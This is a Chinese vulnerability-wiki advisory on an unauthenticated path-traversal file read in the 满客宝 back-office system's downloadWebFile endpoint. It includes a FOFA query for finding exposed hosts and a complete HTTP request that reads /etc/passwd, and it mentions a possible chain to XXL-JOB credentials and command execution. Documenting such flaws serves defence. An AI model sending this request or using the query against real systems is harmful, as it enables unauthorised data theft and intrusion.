---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "满客宝后台管理 downloadWebFile ossKey路径读取"
product: "满客宝后台管理"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "XVE-2024-18926"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本；Linux"
prerequisites: "声明未认证"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%BB%A1%E5%AE%A2%E5%AE%9D/%E6%BB%A1%E5%AE%A2%E5%AE%9D%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20downloadWebFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%28XVE-2024-18926%29.md"
fofa: "body=\"满客宝后台管理系统\""
fofa_unverified: "body="
id: "vw-eb37b24510587ae39463fb86"
entity_id: "ve-eb37b24510587ae39463fb86"
schema_version: "1"
---

# 满客宝后台管理 downloadWebFile ossKey路径读取

## 条目说明

- 对象与具体问题：满客宝后台管理；downloadWebFile ossKey路径读取
- 版本、配置及部署条件：无版本；Linux
- 认证与权限前提：声明未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- XVE误置cnvd，FOFA截断
- XXL-JOB凭据/RCE是条件链，示例只passwd不证明该配置可读或密码有效
- 在野/影响中无依据，修复缺build

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

满客宝后台管理系统 downloadWebFile 接口存在存在任意文件读取漏洞，未经身份验证的远程攻击者可通过该漏洞读取系统配置文件，获取XXL-JOB账户密码，若XXL-JOB部署在公网，可能会进一步导致后台远程命令执行。

影响版本

满客宝后台管理系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 中 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="满客宝后台管理系统"

POC/EXP：

```http
GET /base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
```


![image-20240801172047726](./.resource/满客宝后台管理系统downloadWebFile任意文件读取漏洞XVE-2024-18926/media/image-20240801172047726.png)


## 修复方案

1. 关闭互联网暴露面或接口设置访问权限

   升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
